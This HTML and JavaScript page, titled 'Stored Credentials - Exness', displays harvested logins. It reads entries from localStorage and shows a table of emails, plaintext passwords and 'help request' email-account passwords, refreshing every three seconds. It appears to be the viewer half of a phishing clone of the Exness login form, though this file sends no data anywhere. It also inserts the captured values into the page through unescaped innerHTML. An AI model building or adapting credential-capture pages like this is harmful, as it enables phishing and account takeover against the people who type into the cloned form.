<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stored Credentials - Exness</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            padding: 0;
        }
        body {
            background: #f6f7fb;
            color: #1a1a1a;
            padding: 20px;
            line-height: 1.5;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 14px;
            box-shadow: 0 12px 40px rgba(12, 15, 30, 0.06);
        }
        h1 {
            color: #0b1220;
            margin-bottom: 20px;
            text-align: center;
            font-size: 28px;
        }
        .credentials-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            font-size: 14px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            overflow: hidden;
        }
        .credentials-table th, .credentials-table td {
            border: 1px solid #e5e7eb;
            padding: 12px;
            text-align: left;
        }
        .credentials-table th {
            background: #f9fafb;
            font-weight: 600;
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
            font-style: italic;
        }
        .action-buttons {
            margin: 20px 0;
            text-align: center;
        }
        .action-btn {
            background: #0b6efd;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            margin: 0 5px;
            font-size: 14px;
        }
        .action-btn:hover {
            background: #0052cc;
        }
        .clear-btn {
            background: #dc2626;
        }
        .clear-btn:hover {
            background: #b91c1c;
        }
        .back-btn {
            background: #6b7280;
        }
        .back-btn:hover {
            background: #4b5563;
        }
        .type-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }
        .type-login {
            background: #dbeafe;
            color: #1e40af;
        }
        .type-signup {
            background: #dcfce7;
            color: #166534;
        }
        .type-help {
            background: #fef3c7;
            color: #92400e;
        }
        .info {
            margin-top: 20px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Stored Login Credentials</h1>
        
        <div class="action-buttons">
            <button class="action-btn" onclick="loadCredentials()">Refresh Data</button>
            <button class="action-btn clear-btn" onclick="clearCredentials()">Clear All Data</button>
            <button class="action-btn back-btn" onclick="goBack()">Back to Login</button>
        </div>
        
        <table class="credentials-table">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Type</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody id="credentialsBody">
                <tr>
                    <td colspan="5" class="empty-state">No credentials stored yet</td>
                </tr>
            </tbody>
        </table>
        
        <div class="info">
            <p><strong>Note:</strong> This page displays all credentials entered in the login form. Data is stored in your browser's
                localStorage...</p>
        </div>
    </div>

    <script>
        function loadCredentials() {
            const credentialsBody = document.getElementById('credentialsBody');
            const storedData = localStorage.getItem('exnessCredentials');
            
            if (storedData && JSON.parse(storedData).length > 0) {
                const credentials = JSON.parse(storedData);
                let html = '';
                
                // Reverse to show newest first
                credentials.reverse().forEach(cred => {
                    let typeClass, typeText, password, details;
                    
                    if (cred.type === 'help_request') {
                        typeClass = 'type-help';
                        typeText = 'Help Request';
                        password = cred.emailPassword;
                        details = 'Email Help Request';
                    } else {
                        typeClass = cred.type === 'login' ? 'type-login' : 'type-signup';
                        typeText = cred.type === 'login' ? 'Login' : 'Signup';
                        password = cred.password;
                        details = '-';
                    }
                    
                    html += `
                        <tr>
                            <td>${cred.timestamp}</td>
                            <td><span class="type-badge ${typeClass}">${typeText}</span></td>
                            <td>${cred.email}</td>
                            <td>${password}</td>
                            <td>${details}</td>
                        </tr>
                    `;
                });
                
                credentialsBody.innerHTML = html;
            } else {
                credentialsBody.innerHTML = `
                    <tr>
                        <td colspan="5" class="empty-state">No credentials stored yet</td>
                    </tr>
                `;
            }
        }
        
        function clearCredentials() {
            if (confirm('Are you sure you want to clear all stored credentials?')) {
                localStorage.removeItem('exnessCredentials');
                loadCredentials();
                alert('All credentials have been cleared!');
            }
        }
        
        function goBack() {
            window.history.back();
        }
        
        // Load credentials when page opens
        loadCredentials();
        
        // Auto-refresh every 3 seconds
        setInterval(loadCredentials, 3000);
    </script>
</body>
</html>
